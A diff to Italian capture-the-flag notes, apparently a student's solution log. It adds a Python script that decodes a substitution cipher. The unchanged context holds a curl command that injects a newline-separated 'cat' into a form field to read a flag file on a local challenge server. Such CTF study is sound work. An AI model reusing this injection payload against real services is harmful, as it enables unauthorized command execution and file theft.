@@ -236,3 +236,21 @@ cat<path/to/flag.txt
 #Caso particolare dell'esercizio
 curl -XPOST -d 'dest=0.0.0.0%0acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag' 'http://localhost:8090/'
 ```
+
+------------------------
+
+### Cifrario a sostituzione 2 figo
+
+```
+with open("ciphertext.txt", "r") as ciphertext_file:
+    ciphertext = ciphertext_file.read().lower()
+
+trans = str.maketrans(
+    "abcdefghijklmnopqrstuvwxyz",
+    "IMZOPKSTEBWGNRVL_UJAYHF_DC",
+)
+
+print(ciphertext.translate(trans))
+```
+
+
